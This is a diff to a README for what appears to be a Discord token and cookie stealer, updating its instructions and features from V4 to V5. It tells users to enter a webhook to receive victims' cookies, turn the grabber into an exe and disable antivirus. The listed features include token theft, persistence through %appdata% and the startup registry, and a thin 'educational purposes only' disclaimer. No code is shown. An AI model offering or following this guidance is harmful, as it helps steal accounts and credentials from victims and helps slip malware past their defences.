@@ -58,7 +58,7 @@ Download the zip file and uncompress it.
 
 It **shouldn't** be flagged by your antivirus but if it is just disable it.
 
-# Instructions (V4)
+# Instructions (V5)
 *View pictures at the bottom for help*
 
 How to use 
@@ -68,7 +68,7 @@ How to use
 4. Put in the webhook from the channel you want to receive cookies from.
 5. When it is complete check the same directory as the setup for a grabber Python script that you can convert to exe.
 
-# Features (V4)
+# Features (V5)
 
 - Discord token info
 - Nitro
@@ -101,18 +101,10 @@ How to use
  - Place stub in %appdata%
  - Add to startup registry
 
-# How To Convert to Exe
-https://www.datacamp.com/tutorial/two-simple-methods-to-convert-a-python-file-to-an-exe-file
+> [!CAUTION]
+> This tool is for educational purposes only. It is coded for you to see how your files are simply stolen and how to take action. Do not use for illegal purposes. We are never responsible for illegal use. <bold>Educational purpose only!</bold>
 
-# Disclaimer
+> [!WARNING]
+> By downloading this, you agree to the Commons Clause license and that you're not allowed to sell this repository or any code from this repository. For more info see https://commonsclause.com/.
 
-This is for educational purposes only
-
-I do not take any responsibility for the actions that people use this for.
-# Video
-https://youtu.be/T4qOF5IT4mc
-# Grabber Log (V2)
-![image](https://user-images.githubusercontent.com/82431866/208489136-14fa7a54-93fd-40de-8d04-e5e82dd11aff.png)
-![image](https://user-images.githubusercontent.com/82431866/204924707-178f6eef-7b59-44d1-80d2-f0d8ca319313.png)
-# Old Pictures
-![image](https://user-images.githubusercontent.com/82431866/203202194-a203901a-9e09-495f-9c58-ae84db3b9cf4.png)
+<a href=#top>Back to Top</a></p>
